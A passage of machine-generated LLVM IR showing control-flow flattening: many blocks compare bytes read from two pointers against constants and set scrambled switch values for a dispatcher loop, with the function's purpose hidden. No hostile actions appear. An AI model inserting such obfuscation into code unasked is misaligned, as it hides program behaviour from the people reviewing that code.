; <label>:283:                                    ; preds = %loopEntry
  %284 = load i8, i8* %3, align 1
  %285 = zext i8 %284 to i32
  %286 = icmp eq i32 %285, 196
  %287 = select i1 %286, i32 1839754081, i32 235745372
  store i32 %287, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:288:                                    ; preds = %loopEntry
  %289 = load i8, i8* %2, align 1
  %290 = zext i8 %289 to i32
  %291 = icmp eq i32 %290, 152
  %292 = select i1 %291, i32 -1884301627, i32 872571810
  store i32 %292, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  %294 = load i8, i8* %3, align 1
  %295 = zext i8 %294 to i32
  %296 = icmp eq i32 %295, 82
  %297 = select i1 %296, i32 1839754081, i32 872571810
  store i32 %297, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:298:                                    ; preds = %loopEntry
  %299 = load i8, i8* %2, align 1
  %300 = zext i8 %299 to i32
  %301 = icmp eq i32 %300, 152
  %302 = select i1 %301, i32 -810824413, i32 -1353576383
  store i32 %302, i32* %switchVar
  br label %loopEnd

; <label>:303:                                    ; preds = %loopEntry
  %304 = load i8, i8* %3, align 1
  %305 = zext i8 %304 to i32
  %306 = icmp eq i32 %305, 229
  %307 = select i1 %306, i32 1839754081, i32 -1353576383
  store i32 %307, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:308:                                    ; preds = %loopEntry
  %309 = load i8, i8* %2, align 1
  %310 = zext i8 %309 to i32
  %311 = icmp eq i32 %310, 157
  %312 = select i1 %311, i32 855384314, i32 1887521771
  store i32 %312, i32* %switchVar
  br label %loopEnd

; <label>:313:                                    ; preds = %loopEntry
  %314 = load i8, i8* %3, align 1
  %315 = zext i8 %314 to i32
  %316 = icmp eq i32 %315, 202
  %317 = select i1 %316, i32 1839754081, i32 1887521771
  store i32 %317, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:318:                                    ; preds = %loopEntry
  %319 = load i8, i8* %2, align 1
  %320 = zext i8 %319 to i32
  %321 = icmp eq i32 %320, 157
  %322 = select i1 %321, i32 865078093, i32 -813268719
  store i32 %322, i32* %switchVar
  br label %loopEnd

; <label>:323:                                    ; preds = %loopEntry
  %324 = load i8, i8* %3, align 1
  %325 = zext i8 %324 to i32
  %326 = icmp eq i32 %325, 217
  %327 = select i1 %326, i32 1839754081, i32 -813268719
  store i32 %327, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:328:                                    ; preds = %loopEntry
  %329 = load i8, i8* %2, align 1
  %330 = zext i8 %329 to i32
  %331 = icmp eq i32 %330, 161
  %332 = select i1 %331, i32 2113305181, i32 -87623977
  store i32 %332, i32* %switchVar
  br label %loopEnd

; <label>:333:                                    ; preds = %loopEntry
  %334 = load i8, i8* %3, align 1
  %335 = zext i8 %334 to i32
  %336 = icmp eq i32 %335, 124
  %337 = select i1 %336, i32 1839754081, i32 -87623977
  store i32 %337, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:338:                                    ; preds = %loopEntry
  %339 = load i8, i8* %2, align 1
  %340 = zext i8 %339 to i32
  %341 = icmp eq i32 %340, 162
  %342 = select i1 %341, i32 -1004535020, i32 -1404658951
  store i32 %342, i32* %switchVar
  br label %loopEnd

; <label>:343:                                    ; preds = %loopEntry
  %344 = load i8, i8* %3, align 1
  %345 = zext i8 %344 to i32
  %346 = icmp eq i32 %345, 32
  %347 = select i1 %346, i32 1839754081, i32 -1404658951
  store i32 %347, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:348:                                    ; preds = %loopEntry
  %349 = load i8, i8* %2, align 1
  %350 = zext i8 %349 to i32
  %351 = icmp eq i32 %350, 155
  %352 = select i1 %351, i32 -932539351, i32 -1000572808
  store i32 %352, i32* %switchVar
  br label %loopEnd

; <label>:353:                                    ; preds = %loopEntry
  %354 = load i8, i8* %3, align 1
  %355 = zext i8 %354 to i32
  %356 = icmp eq i32 %355, 96
  %357 = select i1 %356, i32 1839754081, i32 -1000572808
  store i32 %357, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:358:                                    ; preds = %loopEntry
  %359 = load i8, i8* %2, align 1
  %360 = zext i8 %359 to i32
  %361 = icmp eq i32 %360, 155
  %362 = select i1 %361, i32 -1611901348, i32 1938420883
  store i32 %362, i32* %switchVar
  br label %loopEnd

; <label>:363:                                    ; preds = %loopEntry
  %364 = load i8, i8* %3, align 1
  %365 = zext i8 %364 to i32
  %366 = icmp eq i32 %365, 149
  %367 = select i1 %366, i32 1839754081, i32 1938420883
  store i32 %367, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:368:                                    ; preds = %loopEntry
  %369 = load i8, i8* %2, align 1
  %370 = zext i8 %369 to i32
  %371 = icmp eq i32 %370, 155
  %372 = select i1 %371, i32 276549235, i32 715454050
  store i32 %372, i32* %switchVar
  br label %loopEnd

; <label>:373:                                    ; preds = %loopEntry
  %374 = load i8, i8* %3, align 1
  %375 = zext i8 %374 to i32
  %376 = icmp eq i32 %375, 155
  %377 = select i1 %376, i32 1839754081, i32 715454050
  store i32 %377, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:378:                                    ; preds = %loopEntry
  %379 = load i8, i8* %2, align 1
  %380 = zext i8 %379 to i32
  %381 = icmp eq i32 %380, 155
  %382 = select i1 %381, i32 -783335268, i32 1213671620
  store i32 %382, i32* %switchVar
  br label %loopEnd

; <label>:383:                                    ; preds = %loopEntry
  %384 = load i8, i8* %3, align 1
  %385 = zext i8 %384 to i32
  %386 = icmp eq i32 %385, 178
  %387 = select i1 %386, i32 1839754081, i32 1213671620
  store i32 %387, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:388:                                    ; preds = %loopEntry
  %389 = load i8, i8* %2, align 1
  %390 = zext i8 %389 to i32
  %391 = icmp eq i32 %390, 164
  %392 = select i1 %391, i32 -1328574616, i32 -721087869
  store i32 %392, i32* %switchVar
  br label %loopEnd

; <label>:393:                                    ; preds = %loopEntry
  %394 = load i8, i8* %3, align 1
  %395 = zext i8 %394 to i32
  %396 = icmp eq i32 %395, 158
  %397 = select i1 %396, i32 1839754081, i32 -721087869
  store i32 %397, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:398:                                    ; preds = %loopEntry
  %399 = load i8, i8* %2, align 1
  %400 = zext i8 %399 to i32
  %401 = icmp eq i32 %400, 156
  %402 = select i1 %401, i32 -779196620, i32 269053550
  store i32 %402, i32* %switchVar
  br label %loopEnd

; <label>:403:                                    ; preds = %loopEntry
  %404 = load i8, i8* %3, align 1
  %405 = zext i8 %404 to i32
  %406 = icmp eq i32 %405, 9
  %407 = select i1 %406, i32 1839754081, i32 269053550
  store i32 %407, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:408:                                    ; preds = %loopEntry
  %409 = load i8, i8* %2, align 1
  %410 = zext i8 %409 to i32
  %411 = icmp eq i32 %410, 167
  %412 = select i1 %411, i32 -791047576, i32 1869769776
  store i32 %412, i32* %switchVar
  br label %loopEnd

; <label>:413:                                    ; preds = %loopEntry
  %414 = load i8, i8* %3, align 1
  %415 = zext i8 %414 to i32
  %416 = icmp eq i32 %415, 44
  %417 = select i1 %416, i32 1839754081, i32 1869769776
  store i32 %417, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:418:                                    ; preds = %loopEntry
  %419 = load i8, i8* %2, align 1
  %420 = zext i8 %419 to i32
  %421 = icmp eq i32 %420, 168
  %422 = select i1 %421, i32 -278485080, i32 -655588798
  store i32 %422, i32* %switchVar
  br label %loopEnd

; <label>:423:                                    ; preds = %loopEntry
  %424 = load i8, i8* %3, align 1
  %425 = zext i8 %424 to i32
  %426 = icmp eq i32 %425, 68
  %427 = select i1 %426, i32 1839754081, i32 -655588798
  store i32 %427, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:428:                                    ; preds = %loopEntry
  %429 = load i8, i8* %2, align 1
  %430 = zext i8 %429 to i32
  %431 = icmp eq i32 %430, 168
  %432 = select i1 %431, i32 -608656919, i32 421092030
  store i32 %432, i32* %switchVar
  br label %loopEnd

; <label>:433:                                    ; preds = %loopEntry
  %434 = load i8, i8* %3, align 1
  %435 = zext i8 %434 to i32
  %436 = icmp eq i32 %435, 85
  %437 = select i1 %436, i32 1839754081, i32 421092030
  store i32 %437, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:438:                                    ; preds = %loopEntry
  %439 = load i8, i8* %2, align 1
  %440 = zext i8 %439 to i32
  %441 = icmp eq i32 %440, 168
  %442 = select i1 %441, i32 533644520, i32 -1835177391
  store i32 %442, i32* %switchVar
  br label %loopEnd

; <label>:443:                                    ; preds = %loopEntry
  %444 = load i8, i8* %3, align 1
  %445 = zext i8 %444 to i32
  %446 = icmp eq i32 %445, 102
  %447 = select i1 %446, i32 1839754081, i32 -1835177391
  store i32 %447, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:448:                                    ; preds = %loopEntry
  %449 = load i8, i8* %2, align 1
  %450 = zext i8 %449 to i32
  %451 = icmp eq i32 %450, 203
  %452 = select i1 %451, i32 -1370870659, i32 -413479631
  store i32 %452, i32* %switchVar
  br label %loopEnd

; <label>:453:                                    ; preds = %loopEntry
  %454 = load i8, i8* %3, align 1
  %455 = zext i8 %454 to i32
  %456 = icmp eq i32 %455, 59
  %457 = select i1 %456, i32 1839754081, i32 -413479631
  store i32 %457, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:458:                                    ; preds = %loopEntry
  %459 = load i8, i8* %2, align 1
  %460 = zext i8 %459 to i32
  %461 = icmp eq i32 %460, 204
  %462 = select i1 %461, i32 292683985, i32 -41677309
  store i32 %462, i32* %switchVar
  br label %loopEnd

; <label>:463:                                    ; preds = %loopEntry
  %464 = load i8, i8* %3, align 1
  %465 = zext i8 %464 to i32
  %466 = icmp eq i32 %465, 34
  %467 = select i1 %466, i32 1839754081, i32 -41677309
  store i32 %467, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:468:                                    ; preds = %loopEntry
  %469 = load i8, i8* %2, align 1
  %470 = zext i8 %469 to i32
  %471 = icmp eq i32 %470, 207
  %472 = select i1 %471, i32 1085612562, i32 -2049058587
  store i32 %472, i32* %switchVar
  br label %loopEnd

; <label>:473:                                    ; preds = %loopEntry
  %474 = load i8, i8* %3, align 1
  %475 = zext i8 %474 to i32
  %476 = icmp eq i32 %475, 30
  %477 = select i1 %476, i32 1839754081, i32 -2049058587
  store i32 %477, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:478:                                    ; preds = %loopEntry
  %479 = load i8, i8* %2, align 1
  %480 = zext i8 %479 to i32
  %481 = icmp eq i32 %480, 117
  %482 = select i1 %481, i32 2019957407, i32 921827208
  store i32 %482, i32* %switchVar
  br label %loopEnd

; <label>:483:                                    ; preds = %loopEntry
  %484 = load i8, i8* %3, align 1
  %485 = zext i8 %484 to i32
  %486 = icmp eq i32 %485, 55
  %487 = select i1 %486, i32 1839754081, i32 921827208
  store i32 %487, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:488:                                    ; preds = %loopEntry
  %489 = load i8, i8* %2, align 1
  %490 = zext i8 %489 to i32
  %491 = icmp eq i32 %490, 117
  %492 = select i1 %491, i32 -909267514, i32 -44512936
  store i32 %492, i32* %switchVar
  br label %loopEnd

; <label>:493:                                    ; preds = %loopEntry
  %494 = load i8, i8* %3, align 1
  %495 = zext i8 %494 to i32
  %496 = icmp eq i32 %495, 56
  %497 = select i1 %496, i32 1839754081, i32 -44512936
  store i32 %497, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:498:                                    ; preds = %loopEntry
  %499 = load i8, i8* %2, align 1
  %500 = zext i8 %499 to i32
  %501 = icmp eq i32 %500, 80
  %502 = select i1 %501, i32 807153805, i32 2126274594
  store i32 %502, i32* %switchVar
  br label %loopEnd

; <label>:503:                                    ; preds = %loopEntry
  %504 = load i8, i8* %3, align 1
  %505 = zext i8 %504 to i32
  %506 = icmp eq i32 %505, 235
  %507 = select i1 %506, i32 1839754081, i32 2126274594
  store i32 %507, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:508:                                    ; preds = %loopEntry
  %509 = load i8, i8* %2, align 1
  %510 = zext i8 %509 to i32
  %511 = icmp eq i32 %510, 207
  %512 = select i1 %511, i32 1277061850, i32 -1052032188
  store i32 %512, i32* %switchVar
  br label %loopEnd

; <label>:513:                                    ; preds = %loopEntry
  %514 = load i8, i8* %3, align 1
  %515 = zext i8 %514 to i32
  %516 = icmp eq i32 %515, 120
  %517 = select i1 %516, i32 1839754081, i32 -1052032188
  store i32 %517, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:518:                                    ; preds = %loopEntry
  %519 = load i8, i8* %2, align 1
  %520 = zext i8 %519 to i32
  %521 = icmp eq i32 %520, 209
  %522 = select i1 %521, i32 -1960976039, i32 -2120159738
  store i32 %522, i32* %switchVar
  br label %loopEnd

; <label>:523:                                    ; preds = %loopEntry
  %524 = load i8, i8* %3, align 1
  %525 = zext i8 %524 to i32
  %526 = icmp eq i32 %525, 35
  %527 = select i1 %526, i32 1839754081, i32 -2120159738
  store i32 %527, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:528:                                    ; preds = %loopEntry
  %529 = load i8, i8* %2, align 1
  %530 = zext i8 %529 to i32
  %531 = icmp eq i32 %530, 64
  %532 = select i1 %531, i32 1752442977, i32 -1541140100
  store i32 %532, i32* %switchVar
  br label %loopEnd

; <label>:533:                                    ; preds = %loopEntry
  %534 = load i8, i8* %3, align 1
  %535 = zext i8 %534 to i32
  %536 = icmp eq i32 %535, 70
  %537 = select i1 %536, i32 1839754081, i32 -1541140100
  store i32 %537, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:538:                                    ; preds = %loopEntry
  %539 = load i8, i8* %2, align 1
  %540 = zext i8 %539 to i32
  %541 = icmp eq i32 %540, 172
  %542 = select i1 %541, i32 304857555, i32 1326709101
  store i32 %542, i32* %switchVar
  br label %loopEnd

; <label>:543:                                    ; preds = %loopEntry
  %544 = load i8, i8* %3, align 1
  %545 = zext i8 %544 to i32
  %546 = icmp sge i32 %545, 16
  %547 = select i1 %546, i32 257033251, i32 1326709101
  store i32 %547, i32* %switchVar
  br label %loopEnd

; <label>:548:                                    ; preds = %loopEntry
  %549 = load i8, i8* %3, align 1
  %550 = zext i8 %549 to i32
  %551 = icmp slt i32 %550, 32
  %552 = select i1 %551, i32 1839754081, i32 1326709101
  store i32 %552, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:553:                                    ; preds = %loopEntry
  %554 = load i8, i8* %2, align 1
  %555 = zext i8 %554 to i32
  %556 = icmp eq i32 %555, 100
  %557 = select i1 %556, i32 -2116382062, i32 -1872530230
  store i32 %557, i32* %switchVar
  br label %loopEnd

; <label>:558:                                    ; preds = %loopEntry
  %559 = load i8, i8* %3, align 1
  %560 = zext i8 %559 to i32
  %561 = icmp sge i32 %560, 64
  %562 = select i1 %561, i32 -538569901, i32 -1872530230
  store i32 %562, i32* %switchVar
  br label %loopEnd

; <label>:563:                                    ; preds = %loopEntry
  %564 = load i8, i8* %3, align 1
  %565 = zext i8 %564 to i32
  %566 = icmp slt i32 %565, 127
  %567 = select i1 %566, i32 1839754081, i32 -1872530230
  store i32 %567, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:568:                                    ; preds = %loopEntry
  %569 = load i8, i8* %2, align 1
  %570 = zext i8 %569 to i32
  %571 = icmp eq i32 %570, 169
  %572 = select i1 %571, i32 814938097, i32 -10034970
  store i32 %572, i32* %switchVar
  br label %loopEnd

; <label>:573:                                    ; preds = %loopEntry
  %574 = load i8, i8* %3, align 1
  %575 = zext i8 %574 to i32
  %576 = icmp eq i32 %575, 254
  %577 = select i1 %576, i32 1839754081, i32 -10034970
  store i32 %577, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:578:                                    ; preds = %loopEntry
  %579 = load i8, i8* %2, align 1
  %580 = zext i8 %579 to i32
  %581 = icmp eq i32 %580, 198
  %582 = select i1 %581, i32 -1206023047, i32 -1155685680
  store i32 %582, i32* %switchVar
  br label %loopEnd

; <label>:583:                                    ; preds = %loopEntry
  %584 = load i8, i8* %3, align 1
  %585 = zext i8 %584 to i32
  %586 = icmp sge i32 %585, 18
  %587 = select i1 %586, i32 -1453268912, i32 -1155685680
  store i32 %587, i32* %switchVar
  br label %loopEnd

; <label>:588:                                    ; preds = %loopEntry
  %589 = load i8, i8* %3, align 1
  %590 = zext i8 %589 to i32
  %591 = icmp slt i32 %590, 20
  %592 = select i1 %591, i32 1839754081, i32 -1155685680
  store i32 %592, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:593:                                    ; preds = %loopEntry
  %594 = load i8, i8* %2, align 1
  %595 = zext i8 %594 to i32
  %596 = icmp eq i32 %595, 64
  %597 = select i1 %596, i32 -358539224, i32 -220623755
  store i32 %597, i32* %switchVar
  br label %loopEnd

; <label>:598:                                    ; preds = %loopEntry
  %599 = load i8, i8* %3, align 1
  %600 = zext i8 %599 to i32
  %601 = icmp sge i32 %600, 69
  %602 = select i1 %601, i32 -770713152, i32 -220623755
  store i32 %602, i32* %switchVar
  br label %loopEnd

; <label>:603:                                    ; preds = %loopEntry
  %604 = load i8, i8* %3, align 1
  %605 = zext i8 %604 to i32
  %606 = icmp slt i32 %605, 227
  %607 = select i1 %606, i32 1839754081, i32 -220623755
  store i32 %607, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:608:                                    ; preds = %loopEntry
  %609 = load i8, i8* %2, align 1
  %610 = zext i8 %609 to i32
  %611 = icmp eq i32 %610, 128
  %612 = select i1 %611, i32 1023208173, i32 -634114840
  store i32 %612, i32* %switchVar
  br label %loopEnd

; <label>:613:                                    ; preds = %loopEntry
  %614 = load i8, i8* %3, align 1
  %615 = zext i8 %614 to i32
  %616 = icmp sge i32 %615, 35
  %617 = select i1 %616, i32 806914545, i32 -634114840
  store i32 %617, i32* %switchVar
  br label %loopEnd

; <label>:618:                                    ; preds = %loopEntry
  %619 = load i8, i8* %3, align 1
  %620 = zext i8 %619 to i32
  %621 = icmp slt i32 %620, 237
  %622 = select i1 %621, i32 1839754081, i32 -634114840
  store i32 %622, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:623:                                    ; preds = %loopEntry
  %624 = load i8, i8* %2, align 1
  %625 = zext i8 %624 to i32
  %626 = icmp eq i32 %625, 129
  %627 = select i1 %626, i32 667125268, i32 155338037
  store i32 %627, i32* %switchVar
  br label %loopEnd

; <label>:628:                                    ; preds = %loopEntry
  %629 = load i8, i8* %3, align 1
  %630 = zext i8 %629 to i32
  %631 = icmp sge i32 %630, 22
  %632 = select i1 %631, i32 -1548625727, i32 155338037
  store i32 %632, i32* %switchVar
  br label %loopEnd

; <label>:633:                                    ; preds = %loopEntry
  %634 = load i8, i8* %3, align 1
  %635 = zext i8 %634 to i32
  %636 = icmp slt i32 %635, 255
  %637 = select i1 %636, i32 1839754081, i32 155338037
  store i32 %637, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:638:                                    ; preds = %loopEntry
  %639 = load i8, i8* %2, align 1
  %640 = zext i8 %639 to i32
  %641 = icmp eq i32 %640, 130
  %642 = select i1 %641, i32 -180605845, i32 -650568076
  store i32 %642, i32* %switchVar
  br label %loopEnd

; <label>:643:                                    ; preds = %loopEntry
  %644 = load i8, i8* %3, align 1
  %645 = zext i8 %644 to i32
  %646 = icmp sge i32 %645, 40
  %647 = select i1 %646, i32 -1603970235, i32 -650568076
  store i32 %647, i32* %switchVar
  br label %loopEnd

; <label>:648:                                    ; preds = %loopEntry
  %649 = load i8, i8* %3, align 1
  %650 = zext i8 %649 to i32
  %651 = icmp slt i32 %650, 168
  %652 = select i1 %651, i32 1839754081, i32 -650568076
  store i32 %652, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:653:                                    ; preds = %loopEntry
  %654 = load i8, i8* %2, align 1
  %655 = zext i8 %654 to i32
  %656 = icmp eq i32 %655, 131
  %657 = select i1 %656, i32 -491445705, i32 1692285255
  store i32 %657, i32* %switchVar
  br label %loopEnd

; <label>:658:                                    ; preds = %loopEntry
  %659 = load i8, i8* %3, align 1
  %660 = zext i8 %659 to i32
  %661 = icmp sge i32 %660, 3
  %662 = select i1 %661, i32 -822776006, i32 1692285255
  store i32 %662, i32* %switchVar
  br label %loopEnd

; <label>:663:                                    ; preds = %loopEntry
  %664 = load i8, i8* %3, align 1
  %665 = zext i8 %664 to i32
  %666 = icmp slt i32 %665, 251
  %667 = select i1 %666, i32 1839754081, i32 1692285255
  store i32 %667, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:668:                                    ; preds = %loopEntry
  %669 = load i8, i8* %2, align 1
  %670 = zext i8 %669 to i32
  %671 = icmp eq i32 %670, 132
  %672 = select i1 %671, i32 -2028759450, i32 1540230783
  store i32 %672, i32* %switchVar
  br label %loopEnd

; <label>:673:                                    ; preds = %loopEntry
  %674 = load i8, i8* %3, align 1
  %675 = zext i8 %674 to i32
  %676 = icmp sge i32 %675, 3
  %677 = select i1 %676, i32 -1202656562, i32 1540230783
  store i32 %677, i32* %switchVar
  br label %loopEnd

; <label>:678:                                    ; preds = %loopEntry
  %679 = load i8, i8* %3, align 1
  %680 = zext i8 %679 to i32
  %681 = icmp slt i32 %680, 251
  %682 = select i1 %681, i32 1839754081, i32 1540230783
  store i32 %682, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:683:                                    ; preds = %loopEntry
  %684 = load i8, i8* %2, align 1
  %685 = zext i8 %684 to i32
  %686 = icmp eq i32 %685, 134
  %687 = select i1 %686, i32 687457580, i32 -1993107925
  store i32 %687, i32* %switchVar
  br label %loopEnd

; <label>:688:                                    ; preds = %loopEntry
  %689 = load i8, i8* %3, align 1
  %690 = zext i8 %689 to i32
  %691 = icmp sge i32 %690, 5
  %692 = select i1 %691, i32 -38024677, i32 -1993107925
  store i32 %692, i32* %switchVar
  br label %loopEnd

; <label>:693:                                    ; preds = %loopEntry
  %694 = load i8, i8* %3, align 1
  %695 = zext i8 %694 to i32
  %696 = icmp slt i32 %695, 235
  %697 = select i1 %696, i32 1839754081, i32 -1993107925
  store i32 %697, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:698:                                    ; preds = %loopEntry
  %699 = load i8, i8* %2, align 1
  %700 = zext i8 %699 to i32
  %701 = icmp eq i32 %700, 136
  %702 = select i1 %701, i32 1926800235, i32 -1256674764
  store i32 %702, i32* %switchVar
  br label %loopEnd

; <label>:703:                                    ; preds = %loopEntry
  %704 = load i8, i8* %3, align 1
  %705 = zext i8 %704 to i32
  %706 = icmp sge i32 %705, 177
  %707 = select i1 %706, i32 -1054509648, i32 -1256674764
  store i32 %707, i32* %switchVar
  br label %loopEnd

; <label>:708:                                    ; preds = %loopEntry
  %709 = load i8, i8* %3, align 1
  %710 = zext i8 %709 to i32
  %711 = icmp slt i32 %710, 223
  %712 = select i1 %711, i32 1839754081, i32 -1256674764
  store i32 %712, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:713:                                    ; preds = %loopEntry
  %714 = load i8, i8* %2, align 1
  %715 = zext i8 %714 to i32
  %716 = icmp eq i32 %715, 138
  %717 = select i1 %716, i32 2053167599, i32 2052015793
  store i32 %717, i32* %switchVar
  br label %loopEnd

; <label>:718:                                    ; preds = %loopEntry
  %719 = load i8, i8* %3, align 1
  %720 = zext i8 %719 to i32
  %721 = icmp sge i32 %720, 13
  %722 = select i1 %721, i32 1009691773, i32 2052015793
  store i32 %722, i32* %switchVar
  br label %loopEnd

; <label>:723:                                    ; preds = %loopEntry
  %724 = load i8, i8* %3, align 1
  %725 = zext i8 %724 to i32
  %726 = icmp slt i32 %725, 194
  %727 = select i1 %726, i32 1839754081, i32 2052015793
  store i32 %727, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:728:                                    ; preds = %loopEntry
  %729 = load i8, i8* %2, align 1
  %730 = zext i8 %729 to i32
  %731 = icmp eq i32 %730, 139
  %732 = select i1 %731, i32 1676436158, i32 1044130449
  store i32 %732, i32* %switchVar
  br label %loopEnd

; <label>:733:                                    ; preds = %loopEntry
  %734 = load i8, i8* %3, align 1
  %735 = zext i8 %734 to i32
  %736 = icmp sge i32 %735, 31
  %737 = select i1 %736, i32 1609744867, i32 1044130449
  store i32 %737, i32* %switchVar
  br label %loopEnd

; <label>:738:                                    ; preds = %loopEntry
  %739 = load i8, i8* %3, align 1
  %740 = zext i8 %739 to i32
  %741 = icmp slt i32 %740, 143
  %742 = select i1 %741, i32 1839754081, i32 1044130449
  store i32 %742, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:743:                                    ; preds = %loopEntry
  %744 = load i8, i8* %2, align 1
  %745 = zext i8 %744 to i32
  %746 = icmp eq i32 %745, 140
  %747 = select i1 %746, i32 -867071395, i32 -1161187232
  store i32 %747, i32* %switchVar
  br label %loopEnd

; <label>:748:                                    ; preds = %loopEntry
  %749 = load i8, i8* %3, align 1
  %750 = zext i8 %749 to i32
  %751 = icmp sge i32 %750, 1
  %752 = select i1 %751, i32 162154332, i32 -1161187232
  store i32 %752, i32* %switchVar
  br label %loopEnd

; <label>:753:                                    ; preds = %loopEntry
  %754 = load i8, i8* %3, align 1
  %755 = zext i8 %754 to i32
  %756 = icmp slt i32 %755, 203
  %757 = select i1 %756, i32 1839754081, i32 -1161187232
  store i32 %757, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:758:                                    ; preds = %loopEntry
  %759 = load i8, i8* %2, align 1
  %760 = zext i8 %759 to i32
  %761 = icmp eq i32 %760, 143
  %762 = select i1 %761, i32 -1675554907, i32 1590872107
  store i32 %762, i32* %switchVar
  br label %loopEnd

; <label>:763:                                    ; preds = %loopEntry
  %764 = load i8, i8* %3, align 1
  %765 = zext i8 %764 to i32
  %766 = icmp sge i32 %765, 45
  %767 = select i1 %766, i32 -1478930243, i32 1590872107
  store i32 %767, i32* %switchVar
  br label %loopEnd

; <label>:768:                                    ; preds = %loopEntry
  %769 = load i8, i8* %3, align 1
  %770 = zext i8 %769 to i32
  %771 = icmp slt i32 %770, 233
  %772 = select i1 %771, i32 1839754081, i32 1590872107
  store i32 %772, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:773:                                    ; preds = %loopEntry
  %774 = load i8, i8* %2, align 1
  %775 = zext i8 %774 to i32
  %776 = icmp eq i32 %775, 144
  %777 = select i1 %776, i32 -1633702977, i32 -1419584949
  store i32 %777, i32* %switchVar
  br label %loopEnd

; <label>:778:                                    ; preds = %loopEntry
  %779 = load i8, i8* %3, align 1
  %780 = zext i8 %779 to i32
  %781 = icmp sge i32 %780, 99
  %782 = select i1 %781, i32 1603822377, i32 -1419584949
  store i32 %782, i32* %switchVar
  br label %loopEnd

; <label>:783:                                    ; preds = %loopEntry
  %784 = load i8, i8* %3, align 1
  %785 = zext i8 %784 to i32
  %786 = icmp slt i32 %785, 253
  %787 = select i1 %786, i32 1839754081, i32 -1419584949
  store i32 %787, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:788:                                    ; preds = %loopEntry
  %789 = load i8, i8* %2, align 1
  %790 = zext i8 %789 to i32
  %791 = icmp eq i32 %790, 146
  %792 = select i1 %791, i32 -75600524, i32 -1206293070
  store i32 %792, i32* %switchVar
  br label %loopEnd

; <label>:793:                                    ; preds = %loopEntry
  %794 = load i8, i8* %3, align 1
  %795 = zext i8 %794 to i32
  %796 = icmp sge i32 %795, 165
  %797 = select i1 %796, i32 663646928, i32 -1206293070
  store i32 %797, i32* %switchVar
  br label %loopEnd

; <label>:798:                                    ; preds = %loopEntry
  %799 = load i8, i8* %3, align 1
  %800 = zext i8 %799 to i32
  %801 = icmp slt i32 %800, 166
  %802 = select i1 %801, i32 1839754081, i32 -1206293070
  store i32 %802, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:803:                                    ; preds = %loopEntry
  %804 = load i8, i8* %2, align 1
  %805 = zext i8 %804 to i32
  %806 = icmp eq i32 %805, 147
  %807 = select i1 %806, i32 1624601641, i32 -1094989215
  store i32 %807, i32* %switchVar
  br label %loopEnd

; <label>:808:                                    ; preds = %loopEntry
  %809 = load i8, i8* %3, align 1
  %810 = zext i8 %809 to i32
  %811 = icmp sge i32 %810, 35
  %812 = select i1 %811, i32 -602195871, i32 -1094989215
  store i32 %812, i32* %switchVar
  br label %loopEnd

; <label>:813:                                    ; preds = %loopEntry
  %814 = load i8, i8* %3, align 1
  %815 = zext i8 %814 to i32
  %816 = icmp slt i32 %815, 43
  %817 = select i1 %816, i32 1839754081, i32 -1094989215
  store i32 %817, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:818:                                    ; preds = %loopEntry
